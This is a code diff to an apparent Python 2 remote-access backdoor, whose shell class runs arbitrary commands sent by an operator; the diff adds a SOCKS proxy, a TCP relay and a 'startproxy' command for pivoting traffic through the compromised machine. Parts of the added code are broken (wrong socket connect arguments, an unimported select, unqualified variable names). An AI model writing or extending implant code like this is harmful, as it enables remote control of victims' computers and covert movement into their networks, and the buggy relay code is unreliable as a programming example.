@@ -1,6 +1,8 @@
 #!/usr/bin/env python2
 import socket, subprocess, os, threading, json, base64, datetime, getpass, time, hashlib, random, psutil, zlib, glob
 from Crypto.Cipher import AES
+from twisted.internet import reactor
+from twisted.protocols import socks
 
 def windows_only(func):
 	def tester(junk):
@@ -133,6 +135,53 @@ class Shell:
 	def tab_complete(self, text):
 		return "|".join([f for f in os.listdir('.') if os.path.isfile(f) and f.startswith(text)])
 		
+	def socks_proxy_thread(self):
+		reactor.listenTCP(2080,socks.SOCKSv4Factory("./socks.log"))
+		reactor.run()
+		
+	def start_socks_proxy(self):
+		t = threading.Thread(target=self.socks_proxy_thread)
+		t.daemon = True
+		t.start()
+		
+	def tcp_relay(self):
+		self.local_socket = socket.socket()
+		self.local_socket.connect("127.0.0.1",2080)
+		self.remote_socket = socket.socket()
+		self.remote_socket.connect("127.0.0.1",4080)
+		
+		while True:
+			try:
+				readable, writable, errored = select.select([local_socket, remote_socket], [], [])
+			except Exception as e:
+				print e
+				break
+				
+			if local_socket in readable:
+				try:
+					local_data = local_socket.recv(4096)
+					if not local_data: break
+					remote_socket.sendall(local_data)
+				except Exception as e:
+					print e
+					break
+				
+			if remote_socket in readable:
+				try:
+					remote_data = remote_socket.recv(4096)
+					if not remote_data: break
+					local_socket.sendall(remote_data)
+				except Exception as e:
+					print e
+					break
+					
+	def create_tcp_relay(self):
+		self.start_socks_proxy()
+		t = threading.Thread(target=self.tcp_relay)
+		t.daemon = True
+		t.start()
+		return "ok"
+					
 	def handle_command(self, data):
 		command = data.split()[0]
 		try:
@@ -154,6 +203,8 @@ class Shell:
 			output = self.tab_complete(arguments)
 		elif command == "crash":
 			raise Exception("As you wish")
+		elif command == "startproxy":
+			output = self.create_tcp_relay()
 		else:
 			output = self.execute_shell_command(command+" "+arguments)
 			
